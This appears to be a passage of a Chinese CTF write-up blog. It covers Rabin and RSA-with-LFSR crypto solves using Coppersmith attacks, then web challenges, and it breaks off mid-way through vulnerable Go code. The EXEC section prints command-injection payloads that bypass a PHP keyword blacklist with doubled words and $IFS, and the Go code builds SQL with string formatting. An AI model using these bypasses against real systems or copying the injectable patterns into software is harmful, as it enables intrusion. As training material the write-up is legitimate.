p)</span><br><span class="line">	mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">	yp = gmpy2.invert(p, q)</span><br><span class="line">	yq = gmpy2.invert(q, p)</span><br><span class="line">	r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">	rr = n - r</span><br><span class="line">	s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">	ss = n - s</span><br><span class="line">	<span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">m = rabin_decrypt(mm,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;6d22773623d3d5c871692e9985de5f16&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="BABY-RSA"><a href="#BABY-RSA" class="headerlink" title="BABY-RSA"></a>BABY-RSA</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lfsr</span>(<span class="params">status,mask</span>):</span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">num = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">bin</span>(p)[<span class="number">2</span>:]</span><br><span class="line">c = <span class="built_in">pow</span>(num, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;w+&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">    curnum = <span class="built_in">int</span>(hp[i])</span><br><span class="line">    (status,out)=lfsr(status,mask)</span><br><span class="line">    f.write(<span class="built_in">str</span>(curnum ^ out))</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= ...</span></span><br><span class="line"><span class="string">c= ...</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key:</span></span><br><span class="line"><span class="string">0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>RSA $p$ 高位泄露攻击+LFSR。</p><p>先用LFSR结果异或还原 $p$ 高位 $hp$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">lfsr</span>(<span class="params">status,mask</span>):</span><br><span class="line">    out = (status &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(status&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    out^=lastbit </span><br><span class="line">    <span class="keyword">return</span> (out,lastbit)</span><br><span class="line"></span><br><span class="line">status= <span class="number">1</span></span><br><span class="line">mask = <span class="number">0b10110001110010011100100010110101</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&#x27;0101110100100111011011011000111010000111101000101010100100100011010111011000010010100101110110011101110110010100010111001110010011101010111011001100011011010110001010011111111110100110101010101110100110011010110101110110000110010101010000010110100110110110001110101011000011110100011011100101101101001000110010100111000111001111010101011011111110010111100101111001010000100010100001000111010011011111010011101100011101011010011010110001101110110110000110010011001101100000110000110100101010010010110101100101111101110000010011101110010101110100011101100110111111001010&#x27;</span>)</span><br><span class="line">c=[<span class="built_in">int</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> c]</span><br><span class="line"></span><br><span class="line">hp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">568</span>):</span><br><span class="line">	(status,out) = lfsr(status,mask)</span><br><span class="line">	hp += <span class="built_in">str</span>(c[i]^out)</span><br><span class="line"></span><br><span class="line">hp = <span class="built_in">int</span>(hp, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(hp)</span><br><span class="line"><span class="comment"># 484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br></pre></td></tr></table></figure><p>此时 $hp$ 有568位，根据Coppersmith定理，1024位的 $p$ 至少需要高576位才能恢复完整 $p$，需爆破8位二进制位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">hp = <span class="number">484896331241166236766986322307256381427323829969266475890843705533431739217993785274442520213477613786483789873490025705365184544110819157393140954140256890174240795425112</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.digits + <span class="string">&quot;abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">        pp = <span class="built_in">hex</span>(hp) + a + b</span><br><span class="line">        <span class="comment">#p需要用0补全到1024位</span></span><br><span class="line">        pp += <span class="string">&#x27;0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">        <span class="comment">#要加的数字与补全p时0的个数有关</span></span><br><span class="line">        pp = <span class="built_in">int</span>(pp, <span class="number">16</span>)</span><br><span class="line">        p_fake = pp+<span class="number">0x10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">        pbits = <span class="number">1024</span></span><br><span class="line">        kbits = pbits-<span class="number">576</span></span><br><span class="line">        pbar = p_fake &amp; (<span class="number">2</span>^pbits-<span class="number">2</span>^kbits)</span><br><span class="line">        <span class="comment">#print(&quot;upper %d bits (of %d bits) is given&quot; % (pbits-kbits, pbits))</span></span><br><span class="line">        PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">        f = x + pbar</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">            <span class="built_in">print</span>(x0 + pbar)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span>        </span><br><span class="line"><span class="comment"># 90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br></pre></td></tr></table></figure><p>最后常规RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">90225006288627020933267024425797647042965554486273674145474629022335483579168020321334177600624475358419458781387021577078957978886555066264514364951229871833611713144617155837023313756741716041993159155093522769416742461683810041045361926334946115547487234272520914249496954864904467634471167509689549908477</span></span><br><span class="line">n = <span class="number">9363543374665338283861145656340115756598328744870620756798779080826725774691364161648335378062705433999048117564356637094421930886166369832353405527855104576202658647651524758179962855692461154859961903531990172279764099199157181167775307950690492969859829926808950964120678082460448847927074487568619536568740301649988555476490206693181162301088156855926656544441682939839165455244630182978802660669255401576213941067679888164237586879364615664942234247896214195262510935345922512831632385741735810122730130366521612834556565838623708828780093323310348242654778247293430853566054703991781432542625271396246500576703</span></span><br><span class="line">c = <span class="number">3641304537029815746727163894554557322382012539953948183406308231174259571263608621970973671202001456955622458371303424750815017578104069924877881162707673935496925529412748663209884628320657034190702348924814794263041483260377960569530869386619921425415323912964305979776909598200202236912823968867485696101691879580799000240715778010424877093758489309380968229017074542588151574195295436881889313935734282141447498134543053106463951864974512375314091440713165047188590693431938599822340588934591712592995622334522799914563528630705687647950894928965913199772209825508001274120556508220248069647851360567609656517789</span></span><br><span class="line">q = n//p</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;fbbce1e3aa690ebb49039241f940ed26&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="CLICK"><a href="#CLICK" class="headerlink" title="CLICK"></a>CLICK</h3><p>查看源码，找到 <code>main.js</code>，发现 <code>ZmxhZ3thNTNlMTgzOC01OTczLTRlY2MtOWFjMC00ODZlOTA0NThhMTl9Cg==</code>，base64解码得flag。</p><p>​</p><h3 id="Web-sign-in"><a href="#Web-sign-in" class="headerlink" title="Web-sign in"></a>Web-sign in</h3><p>提示robots协议，访问 <code>robots.txt</code>，发现存在 <code>fiag_ls_h3re.php</code>，</p><p>访问发现右键被禁用，加前缀 <code>view-source:</code> 查看源码得flag。</p><p>​</p><h3 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;?&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;*&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;ob_start&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;getenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;error_log&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;echo&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nl&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tac&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tcp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="variable">$shell</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cp&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$shell</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>带黑名单的无回显RCE，可以重定向写命令执行结果到文件，关键字可双写绕过，空格用<code>$IFS</code>绕过。</p><p>列目录：<code>?cmd=llss$IFS/&gt;1.txt</code>，得到根目录flag文件名 <code>ctf_is_fun_flag2021</code>；</p><p>读文件：<code>?cmd=uniq$IFS/ctf_is_fun_flflagag2021&gt;1.txt</code>，得到flag。</p><p>​</p><h3 id="Language"><a href="#Language" class="headerlink" title="Language"></a>Language</h3><p>源码里有python和go两个文件夹，有两个服务，端口8000是python开的，映射到对外端口；内网端口5000是go服务。python代码相当于中转站接受外网请求，处理后转发给go，go进行底层处理。</p><p>go服务中关键代码 <code>backend.go</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	db <span class="string">&quot;ctf/database&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/buger/jsonparser&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Language <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id  <span class="type">int32</span>  <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">	Name <span class="type">string</span> <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">	Votes <span class="type">int64</span> <span class="string">`json:&quot;votes&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line">	ok(w, <span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">List</span><span class="params">(w http.ResponseWriter, _ *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	rows, err := db.Sqlite.Query(<span class="string">&quot;SELECT * FROM languages;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">		fmt.Println(err.Error())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> rows.Close()</span><br><span class="line"></span><br><span class="line">	res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">		<span class="keyword">var</span> pl Language</span><br><span class="line">		_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">		res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">	&#125;</span><br><span class="line">	err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Search</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	reqBody, _ := ioutil.ReadAll(r.Body)</span><br><span class="line"></span><br><span class="line">	votes, err := jsonparser.GetInt(reqBody, <span class="string">&quot;votes&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error reading votes&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name, err := jsonparser.GetString(reqBody, <span class="string">&quot;name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error reading name&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	query := fmt.Sprintf(<span class="string">&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;</span>, votes, name)</span><br><span class="line">	rows, err := db.Sqlite.Query(query)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Something wrong&quot;</span>)</span><br><span class="line">		fmt.Println(err.Error())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	res := <span class="built_in">make</span>([]Language, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">		<span class="keyword">var</span> pl Language</span><br><span class="line">		_ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes)</span><br><span class="line">		res = <span class="built_in">append</span>(res, pl)</span><br><span class="line">	&#125;</span><br><span class="line">	err = json.NewEncoder(w).Encode(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flag</span><span class="params">(w http.ResponseWriter, r *http.Request )</span></span> &#123;</span><br><span class="line">	action:= r.URL.Query().Get(<span class="string">&quot;action&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> action == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error getting action&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	token:= r.URL.Query().Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error getting token&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> secret <span class="type">string</span></span><br><span class="line">	row := db.Sqlite.QueryRow(<span class="string">&quot;SELECT secret FROM token;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err := row.Scan(&amp;secret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fail(w, <span class="string">&quot;Error querying secret 